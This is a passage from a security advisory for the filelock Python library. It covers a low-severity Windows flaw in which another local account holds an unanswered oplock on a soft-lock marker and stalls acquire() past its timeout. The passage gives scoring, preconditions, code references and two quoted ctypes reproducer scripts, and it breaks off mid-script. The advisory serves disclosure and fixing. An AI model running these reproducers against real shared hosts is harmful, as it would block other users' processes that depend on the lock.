      ],
      "description": "On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.\n\nAnother local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**\n\n`AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.\n\nClassification from the review: **security, conditional** on an unheld marker that another account can open.\n\n## Scope and preconditions\n\n- Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.\n- Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.\n- Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.\n- Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.\n- What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.\n- Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.\n- Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.\n\n## Affected code\n\nScanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.\n\n## Introduced\n\n[e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) \"feat(soft): detect and break stale locks\" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.\n\n## Mechanism\n\nEach attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.\n\nA marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.\n\n## Reproduction\n\nThe review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.\n\n**`oplock_vm.py`**\n\n```python\n\"\"\"\nWindows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.\n\nRun on the VM (PowerShell, from the synced worktree, with the fltester account present):\n  C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_vm.py fltester '<password>' C:\\\\tmp\\\\rev4F-oplock\n\n[1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.\n    WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the\n    DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;\n    [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.\n[2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the\n    marker through os.open, which waits for the acknowledgement, past timeout=1.\n\nA thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport ctypes\nimport os\nimport subprocess\nimport sys\nimport threading\nimport time\nfrom ctypes import wintypes\n\nfrom filelock import FileLock, SoftFileLock, Timeout\n\nuser, password, base = sys.argv[1], sys.argv[2], sys.argv[3]\nicacls = os.path.join(os.environ[\"SYSTEMROOT\"], \"System32\", \"icacls.exe\")\nos.makedirs(base, exist_ok=True)\nsubprocess.run([icacls, base, \"/grant\", f\"{user}:(OI)(CI)(M)\"], check=True, capture_output=True)\n\nadvapi32 = ctypes.WinDLL(\"advapi32\", use_last_error=True)\nkernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\nadvapi32.LogonUserW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.LPCWSTR,\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.POINTER(wintypes.HANDLE),\n]\nkernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\nkernel32.CreateFileW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    wintypes.HANDLE,\n]\n\n\nclass Overlapped(ctypes.Structure):\n    _fields_ = (\n        (\"Internal\", ctypes.c_void_p),\n        (\"InternalHigh\", ctypes.c_void_p),\n        (\"Offset\", wintypes.DWORD),\n        (\"OffsetHigh\", wintypes.DWORD),\n        (\"hEvent\", wintypes.HANDLE),\n    )\n\n\nkernel32.DeviceIoControl.argtypes = [\n    wintypes.HANDLE,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    ctypes.POINTER(Overlapped),\n]\nkernel32.CloseHandle.argtypes = [wintypes.HANDLE]\nkernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\n\nGENERIC_READ = 0x80000000\nSHARE_ALL = 0x7\nOPEN_EXISTING = 3\nFLAG_OVERLAPPED = 0x40000000\nINVALID_HANDLE = wintypes.HANDLE(-1).value\nFSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000\nERROR_IO_PENDING = 997\nhold = threading.Event()\nreal_unlink = os.unlink\n\n\ndef impersonate() -> None:\n    token = wintypes.HANDLE()\n    if not advapi32.LogonUserW(user, \".\", password, 3, 0, ctypes.byref(token)):\n        raise ctypes.WinError(ctypes.get_last_error())\n    if not advapi32.ImpersonateLoggedOnUser(token):\n        raise ctypes.WinError(ctypes.get_last_error())\n\n\ndef request_level1(path: str) -> tuple[int, Overlapped] | None:\n    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n    if handle == INVALID_HANDLE:\n        return None\n    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n    if (\n        not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))\n        and ctypes.get_last_error() == ERROR_IO_PENDING\n    ):\n        return handle, overlapped\n    kernel32.CloseHandle(handle)\n    kernel32.CloseHandle(overlapped.hEvent)\n    return None\n\n\ndef drop(granted: tuple[int, Overlapped]) -> None:\n    handle, overlapped = granted\n    kernel32.CloseHandle(handle)\n    kernel32.WaitForSingleObject(overlapped.hEvent, 5000)\n    kernel32.CloseHandle(overlapped.hEvent)\n\n\ndef release_under_oplock_requests(label: str, lock_path: str, cycles: int) -> bool:\n    stop = threading.Event()\n    granted_box: list[tuple[int, Overlapped]] = []\n\n    def spinner() -> None:\n        impersonate()\n        while not stop.is_set():\n            if (granted := request_level1(lock_path)) is not None:\n                granted_box.append(granted)\n                hold.wait()\n                return\n\n    releasing = threading.Event()\n    release_durations: list[float] = []\n\n    def owner() -> None:\n        # thread_local locks release only on the acquiring thread, so acquire and release stay on this one\n        for _ in range(cycles):\n            lock = FileLock(lock_path, is_singleton=False)\n            lock.acquire(timeout=5)\n            started = time.monotonic()\n            releasing.set()\n            lock.release()\n            releasing.clear()\n            release_durations.append(time.monotonic() - started)\n            if granted_box:\n                return\n\n    holder = threading.Thread(target=spinner, daemon=True)\n    holder.start()\n    owner_thread = threading.Thread(target=owner, daemon=True)\n    owner_thread.start()\n    owner_thread.join(60)\n    stalled = owner_thread.is_alive() and releasing.is_set()\n    stop.set()\n    longest = max(release_durations, default=0.0) * 1000\n    print(f\"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms\")\n    if stalled:\n        print(\"  release() still running after 60 s while the oplock holder has not answered the break\")\n        if granted_box:\n            drop(granted_box[0])\n        owner_thread.join(10)\n        print(f\"  release() returned after the holder closed its handle: {not owner_thread.is_alive()}\")\n    return stalled\n\n\nprint(\"[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window\")\nstalled_native = release_under_oplock_requests(\"natural\", os.path.join(base, \"native.lock\"), 500)\n\nprint(\"[1b] the same, with the window between the handle close and the unlink widened to 200 ms\")\n\n\ndef slow_unlink(path: str, *, dir_fd: int | None = None) -> None:\n    time.sleep(0.2)\n    real_unlink(path, dir_fd=dir_fd)\n\n\nos.unlink = slow_unlink\nstalled_scheduled = release_under_oplock_requests(\"scheduled\", os.path.join(base, \"native-scheduled.lock\"), 20)\nos.unlink = real_unlink\n\nprint(\"[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\")\nmarker = os.path.join(base, \"soft.lock\")\nholder = SoftFileLock(marker, is_singleton=False)\nholder.acquire()\nholder_fd = holder._context.lock_file_fd  # noqa: SLF001\nos.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle\nimpersonate_done = threading.Event()\ngranted_soft: list[tuple[int, Overlapped]] = []\n\n\ndef take_soft_oplock() -> None:\n    impersonate()\n    if (granted := request_level1(marker)) is not None:\n        granted_soft.append(granted)\n    impersonate_done.set()\n    hold.wait()\n\n\nthreading.Thread(target=take_soft_oplock, daemon=True).start()\nimpersonate_done.wait(5)\nprint(f\"  oplock granted: {bool(granted_soft)}\")\noutcome = [\"still running after 25 s\"]\n\n\ndef contend() -> None:\n    started = time.monotonic()\n    try:\n        SoftFileLock(marker, is_singleton=False).acquire(timeout=1)\n        outcome[0] = f\"acquired after {time.monotonic() - started:.2f} s\"\n    except Timeout:\n        outcome[0] = f\"Timeout after {time.monotonic() - started:.2f} s\"\n    except OSError as error:\n        outcome[0] = f\"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}\"\n\n\ncontender = threading.Thread(target=contend, daemon=True)\ncontender.start()\ncontender.join(25)\nprint(f\"  contender: {outcome[0]}\")\nsoft_stalled = \"still running\" in outcome[0]\nif granted_soft:\n    drop(granted_soft[0])\n    contender.join(10)\n    print(f\"  after the holder closed: {outcome[0]}\")\nhold.set()\nprint(\"STALLS\" if stalled_native or stalled_scheduled or soft_stalled else \"BOUNDED\")\n```\n\nRecorded output of section `[2]`:\n\n```\n[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\n  oplock granted: True\n  contender: Timeout after 10.02 s\n  after the holder closed: Timeout after 10.02 s\n```\n\n**`oplock_semantics_vm.py`**\n\n```python\n\"\"\"\nWhich path operations wait for an unanswered oplock break on Windows 11 NTFS. Same account, one process.\n\nRun on the VM: C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_semantics_vm.py C:\\\\tmp\\\\rev4F-sem\n\"\"\"\n\nfrom __future__ import annotations\n\nimport ctypes\nimport os\nimport sys\nimport threading\nimport time\nfrom ctypes import wintypes\n\nbase = sys.argv[1]\nos.makedirs(base, exist_ok=True)\nkernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\nkernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\nkernel32.CreateFileW.argtypes = [\n    wintypes.LPCWSTR,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    wintypes.DWORD,\n    wintypes.HANDLE,\n]\n\n\nclass Overlapped(ctypes.Structure):\n    _fields_ = (\n        (\"Internal\", ctypes.c_void_p),\n        (\"InternalHigh\", ctypes.c_void_p),\n        (\"Offset\", wintypes.DWORD),\n        (\"OffsetHigh\", wintypes.DWORD),\n        (\"hEvent\", wintypes.HANDLE),\n    )\n\n\nkernel32.DeviceIoControl.argtypes = [\n    wintypes.HANDLE,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    wintypes.DWORD,\n    ctypes.c_void_p,\n    ctypes.POINTER(Overlapped),\n]\nkernel32.CloseHandle.argtypes = [wintypes.HANDLE]\nkernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\nGENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000\nSHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000\nINVALID_HANDLE = wintypes.HANDLE(-1).value\nLEVELS = {\"level1\": 0x00090000, \"batch\": 0x00090008}\n\n\ndef take(path: str, level: str) -> tuple[int, Overlapped]:\n    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n    pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))\n    assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()\n    return handle, overlapped\n\n\ndef drop(granted: tuple[int, Overlapped]) -> None:\n    kernel32.CloseHandle(granted[0])\n    kernel32.WaitForSingleObject(granted[1].hEvent, 5000)\n    kernel32.CloseHandle(granted[1].hEvent)\n\n\ndef timed(label: str, operation) -> None:  # noqa: ANN001\n    done = threading.Event()\n    result = [\"still running after 15 s\"]\n\n    def run() -> None:\n        started = time.monotonic()\n        try:\n            operation()\n            result[0] = f\"returned after {(time.monotonic() - started) * 1000:.1f} ms\"\n        except OSError as error:\n            result[0] = f\"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}\"\n        done.set()\n\n    threading.Thread(target=run, daemon=True).start()\n    done.wait(15)\n    print(f\"  {label}: {result[0]}\")\n    return done\n\n\ndef open_read(path: str) -> None:\n    os.close(os.open(path, os.O_RDONLY | os.O_BINARY))\n\n\ndef open_write(path: str) -> None:\n    os.close(os.open(path, os.O_RDWR | os.O_BINARY))\n\n\ndef create_new(path: str) -> None:\n    os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))\n\n\nfor level in LEVELS:\n    for label, operation, consumes in (\n        (\"os.open O_RDONLY\", open_read, False),\n        (\"os.open O_RDWR\", open_write, False),\n        (\"os.open O_CREAT|O_EXCL on the existing file\", create_new, False),\n        (\"os.utime by path\", lambda p: os.utime(p, None), False),\n        (\"os.rename\", lambda p: os.rename(p, p + \".moved\"), True),\n        (\"os.unlink\", os.unlink, True),\n    ):\n        path = os.path.join(base, f\"{level}-{label.replace(' ', '_').replace('|', '')}.lock\")\n        with open(path, \"w\", encoding=\"utf-8\") as handle:\n            handle.write(\"1\\nhost\\n\")\n        granted = tak